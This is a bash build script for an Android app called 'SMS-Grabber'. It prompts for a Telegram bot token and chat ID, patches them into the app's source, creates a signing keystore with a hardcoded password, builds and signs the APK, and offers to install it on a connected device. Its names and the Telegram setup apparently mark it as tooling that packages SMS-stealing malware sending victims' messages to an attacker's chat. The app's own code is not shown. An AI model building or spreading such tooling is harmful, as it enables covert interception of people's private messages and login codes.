#!/bin/bash

# SMS-Grabber Build Script
# Automated APK builder with signing and obfuscation

set -e

PROJECT_DIR="SMS-Grabber"
APK_OUTPUT="app/build/outputs/apk/release"
KEYSTORE="smsgrabber.keystore"
KEY_ALIAS="smsgrabber"
KEY_PASS="android123"
TELEGRAM_API="TelegramApi.kt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${RED}"
    echo "╔══════════════════════════════════════╗"
    echo "║        SMS-Grabber Builder          ║"
    echo "║        Android APK Generator        ║"
    echo "╚══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_deps() {
    echo -e "${CYAN}[*] Checking dependencies...${NC}"

    if ! command -v java &>/dev/null; then
        echo -e "${RED}[!] Java JDK 17+ required${NC}"
        exit 1
    fi

    if ! command -v gradle &>/dev/null && [ ! -f "./gradlew" ]; then
        echo -e "${RED}[!] Gradle not found${NC}"
        exit 1
    fi

    echo -e "${GREEN}[✓] All dependencies OK${NC}"
}

config_telegram() {
    echo -e "${CYAN}[*] Configure Telegram Bot${NC}"

    if grep -q "YOUR_BOT_TOKEN_HERE" "$PROJECT_DIR/app/src/main/java/com/smsgrabber/$TELEGRAM_API" 2>/dev/null; then
        echo -ne "${YELLOW}[?] Enter Bot Token: ${NC}"
        read -r BOT_TOKEN
        echo -ne "${YELLOW}[?] Enter Chat ID: ${NC}"
        read -r CHAT_ID

        sed -i "s/YOUR_BOT_TOKEN_HERE/$BOT_TOKEN/" \
            "$PROJECT_DIR/app/src/main/java/com/smsgrabber/$TELEGRAM_API"
        sed -i "s/YOUR_CHAT_ID_HERE/$CHAT_ID/" \
            "$PROJECT_DIR/app/src/main/java/com/smsgrabber/$TELEGRAM_API"

        echo -e "${GREEN}[✓] Telegram configured${NC}"
    else
        echo -e "${GREEN}[✓] Telegram already configured${NC}"
    fi
}

generate_keystore() {
    if [ ! -f "$KEYSTORE" ]; then
        echo -e "${CYAN}[*] Generating keystore...${NC}"
        keytool -genkey -v \
            -keystore "$KEYSTORE" \
            -alias "$KEY_ALIAS" \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -storepass "$KEY_PASS" \
            -keypass "$KEY_PASS" \
            -dname "CN=SMS-Grabber, OU=Dev, O=SMS-Grabber, L=N/A, S=N/A, C=US" \
            2>/dev/null
        echo -e "${GREEN}[✓] Keystore created${NC}"
    fi
}

build_apk() {
    echo -e "${CYAN}[*] Building APK...${NC}"

    cd "$PROJECT_DIR"

    chmod +x gradlew
    ./gradlew clean assembleRelease

    cd ..

    if [ -f "$PROJECT_DIR/$APK_OUTPUT/app-release-unsigned.apk" ]; then
        echo -e "${GREEN}[✓] APK built successfully${NC}"
    else
        echo -e "${RED}[!] Build failed${NC}"
        exit 1
    fi
}

sign_apk() {
    echo -e "${CYAN}[*] Signing APK...${NC}"

    if command -v apksigner &>/dev/null; then
        apksigner sign \
            --ks "$KEYSTORE" \
            --ks-key-alias "$KEY_ALIAS" \
            --ks-pass "pass:$KEY_PASS" \
            --key-pass "pass:$KEY_PASS" \
            --out "smsgrabber-signed.apk" \
            "$PROJECT_DIR/$APK_OUTPUT/app-release-unsigned.apk"
    elif command -v jarsigner &>/dev/null; then
        jarsigner -verbose \
            -sigalg SHA256withRSA \
            -digestalg SHA-256 \
            -keystore "$KEYSTORE" \
            -storepass "$KEY_PASS" \
            -keypass "$KEY_PASS" \
            "$PROJECT_DIR/$APK_OUTPUT/app-release-unsigned.apk" \
            "$KEY_ALIAS"
        cp "$PROJECT_DIR/$APK_OUTPUT/app-release-unsigned.apk" "smsgrabber-signed.apk"
    fi

    echo -e "${GREEN}[✓] APK signed: smsgrabber-signed.apk${NC}"
}

install_apk() {
    if command -v adb &>/dev/null && adb devices | grep -q "device$"; then
        echo -ne "${YELLOW}[?] Install on connected device? [y/N]: ${NC}"
        read -r INSTALL
        if [ "$INSTALL" = "y" ] || [ "$INSTALL" = "Y" ]; then
            adb install -r smsgrabber-signed.apk
            echo -e "${GREEN}[✓] Installed on device${NC}"
        fi
    fi
}

summary() {
    APK_SIZE=$(du -h smsgrabber-signed.apk 2>/dev/null | cut -f1)
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         Build Complete!              ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║  APK: smsgrabber-signed.apk          ║${NC}"
    echo -e "${GREEN}║  Size: $APK_SIZE                          ║${NC}"
    echo -e "${GREEN}║  MD5:  $(md5sum smsgrabber-signed.apk 2>/dev/null | cut -c1-32 || echo 'N/A')  ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════╝${NC}"
    echo ""
}

main() {
    banner
    check_deps
    config_telegram
    generate_keystore
    build_apk
    sign_apk
    install_apk
    summary
}

main "$@"
